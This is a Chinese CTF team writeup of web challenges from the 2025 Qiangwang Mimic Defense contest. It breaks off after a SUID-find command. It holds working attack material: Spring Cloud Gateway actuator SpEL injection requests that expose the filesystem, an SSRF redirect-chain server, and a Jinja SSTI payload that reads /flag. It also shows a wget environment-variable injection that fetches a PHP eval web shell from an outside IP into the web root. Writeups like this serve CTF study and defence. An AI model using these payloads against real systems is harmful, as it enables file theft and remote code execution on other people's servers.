@@ -1,0 +1,3724 @@
+---
+title: "第八届“强网”拟态防御国际精英挑战赛 SU Writeup"
+date: 2025-10-27T23:24:08+00:00
+author: "SUer"
+comments: false
+tags:
+  - "拟态"
+toc: |
+  <nav id="TableOfContents"><ul><li><a href="#web">Web</a><ul><li><a href="#ezcloud">Ezcloud</a></li><li><a href="#safesecret">safesecret</a></li><li><a href="#smallcode">smallcode</a></li><li><a href="#ecshop">ecshop</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#hyperjump">HyperJump</a></li><li><a href="#icall">Icall</a></li></ul></li><li><a href="#mobile">Mobile</a><ul><li><a href="#ezminiapp">EzMiniApp</a></li><li><a href="#just">Just</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#unsafe-parameters">Unsafe Parameters</a></li><li><a href="#fms">FMS</a></li><li><a href="#blockchain">blockchain</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#ciallo_encrypt">Ciallo_Encrypt</a></li></ul></li><li><a href="#低空经济网络安全">低空经济网络安全</a><ul><li><a href="#the-hidden-link">The Hidden Link</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#stack">stack</a></li><li><a href="#pinnote">PinNote</a></li><li><a href="#aaaheap">aaaheap</a></li><li><a href="#babystack">babystack</a></li></ul></li><li><a href="#车联网">车联网</a><ul><li><a href="#can">Can</a></li></ul></li></ul></nav>
+---
+
+<p>本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p><p>以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。</p>
+
+<!--more-->
+
+<h1 id=web>Web</h1><h2 id=ezcloud>Ezcloud</h2><p>最开始是找到了 <a href=https://blog.csdn.net/guo15890025019/article/details/129503346>https://blog.csdn.net/guo15890025019/article/details/129503346</a></p><p>但是复现怎么都不成功，创建路由前面都是对的，然后找有没得Bypass，找到这个</p><p><a href=https://rce.moe/2025/09/29/CVE-2025-41243>https://rce.moe/2025/09/29/CVE-2025-41243</a> 正好解决我的问题，直接开干</p><p>通过bean map 禁用安全限制，然后刷新路由、添加路由</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/actuator/gateway/routes/step1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @systemProperties[&#39;spring.cloud.gateway.restrictive-property-accessor.enabled&#39;] = &#39;false&#39; }&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step1/**&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/actuator/gateway/refresh</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/actuator/gateway/routes/step1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @systemProperties[&#39;spring.cloud.gateway.restrictive-property-accessor.enabled&#39;] = &#39;false&#39; }&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step1/**&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后修改配置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step2&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @resourceHandlerMapping.urlMap[&#39;/webjars/**&#39;].locationValues[0]=&#39;file:///&#39; }&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step2/**&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>继续修改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step3&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @resourceHandlerMapping.urlMap[&#39;/webjars/**&#39;].afterPropertiesSet }&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step3/**&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后访问 /webjars/flag 就能获得 flag，虽然最后是 404 但是不影响</p><p><img src=https://su-team.cn/img/2025-QWNT/1.png alt=img></p><h2 id=safesecret>safesecret</h2><p>漏洞点在这里的ssti</p><p><img src=https://su-team.cn/img/2025-QWNT/2.png alt=img></p><p>获取secret, 这里需要ssrf</p><p><img src=https://su-team.cn/img/2025-QWNT/3.png alt=img></p><p>这一步可以直接ai问出来</p><p>exploit_server.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>http.server</span> <span class=kn>import</span> <span class=n>BaseHTTPRequestHandler</span><span class=p>,</span> <span class=n>HTTPServer</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>CHAIN</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/1&#34;</span><span class=p>:</span> <span class=s2>&#34;/2&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/2&#34;</span><span class=p>:</span> <span class=s2>&#34;/3&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/3&#34;</span><span class=p>:</span> <span class=s2>&#34;/4&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/4&#34;</span><span class=p>:</span> <span class=s2>&#34;/5&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/5&#34;</span><span class=p>:</span> <span class=s2>&#34;/6&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;/6&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:5000/_internal/secret&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Handler</span><span class=p>(</span><span class=n>BaseHTTPRequestHandler</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>nxt</span> <span class=o>=</span> <span class=n>CHAIN</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nxt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Refresh&#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;0; url=</span><span class=si>{</span><span class=n>nxt</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;chain step&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>HTTPServer</span><span class=p>((</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=mi>8000</span><span class=p>),</span> <span class=n>Handler</span><span class=p>)</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>请求</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=o>/</span><span class=n>fetch</span><span class=err>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>vps_ip</span><span class=p>:</span><span class=mi>8000</span><span class=o>/</span><span class=mi>1</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以获取到secret</p><p>接下来是绕过waf, 题目把config ban了, 不能直接往config中存对象来缩小paylaod长度</p><p>注意到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>jinja_env</span><span class=o>.</span><span class=n>globals</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>sget</span><span class=o>=</span><span class=n>sget</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>jinja_env</span><span class=o>.</span><span class=n>globals</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>sset</span><span class=o>=</span><span class=n>sset</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>题目把sset和sget注册到了app.jinja_env.globals中, 这使得我们可以在payload中直接使用这两个函数, 并且可以通过类似<code>sset.__globals__</code>拿到它的__globals__</p><p>并且题目有一个read函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>f</span><span class=p>):</span> <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=n>f</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-QWNT/4.png alt=img></p><p>我们可以从<code>sset.__globals__</code>直接获取到, 并且也可以直接使用sset把某些字符串存进session</p><p>最终构造出以下payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=o>{</span>% print<span class=o>(</span>sset<span class=o>(</span><span class=s1>&#39;g&#39;</span>,request.args.a<span class=o>))</span> %<span class=o>}</span><span class=p>&amp;</span><span class=nv>a</span><span class=o>=</span>__globals__
+</span></span><span class=line><span class=cl><span class=o>{</span>% print<span class=o>(</span>sset<span class=o>(</span><span class=s1>&#39;f&#39;</span>,request.args.a<span class=o>))</span> %<span class=o>}</span><span class=p>&amp;</span><span class=nv>a</span><span class=o>=</span>/flag
+</span></span><span class=line><span class=cl><span class=o>{</span>%print<span class=o>(</span>sset<span class=o>[</span>sget<span class=o>(</span><span class=s1>&#39;g&#39;</span><span class=o>)][</span><span class=s1>&#39;rea&#39;&#39;d&#39;</span><span class=o>](</span>sget<span class=o>(</span><span class=s1>&#39;f&#39;</span><span class=o>)))</span>%<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>分三次执行即可</p><h2 id=smallcode>smallcode</h2><p>参考：<a href=https://yenannn.github.io/2022/05/30/startctf%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%B9%E7%BC%96/>startctf环境变量注入的改编</a></p><p>原题直接，wp照着复现一遍</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>http_proxy</span><span class=o>=</span>156.238.233.111:5566
+</span></span><span class=line><span class=cl><span class=nv>output_document</span><span class=o>=</span>/var/www/html/shell.php
+</span></span></code></pre></td></tr></table></div></div><p>简单编码一下内容</p><p>context=aHR0cF9wcm94eT0xNTYuMjM4LjIzMy4xMTE6NTU2Ng0Kb3V0cHV0X2RvY3VtZW50PS92YXIvd3d3L2h0bWwvc2hlbGwucGhw</p><p>访问/1.txt确认是否正常输入</p><p>vps起一个内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>&lt;?php phpinfo<span class=o>()</span><span class=p>;</span>@eval<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;orange&#39;</span><span class=o>])</span><span class=p>;</span>?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>起一个python</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>make_response</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;1.txt&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span> 
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;text/plain&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Disposition&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;attachment; filename=1.txt&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5566</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这时候输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>env</span><span class=o>=</span><span class=nv>WGETRC</span><span class=o>=</span>/var/www/html/1.txt
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-QWNT/5.png alt=img></p><p><img src=https://su-team.cn/img/2025-QWNT/6.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>find / -perm -4000 -type f -exec ls -la <span class=o>{}</span> 2&gt;/dev/null <span class=se>\;</span>
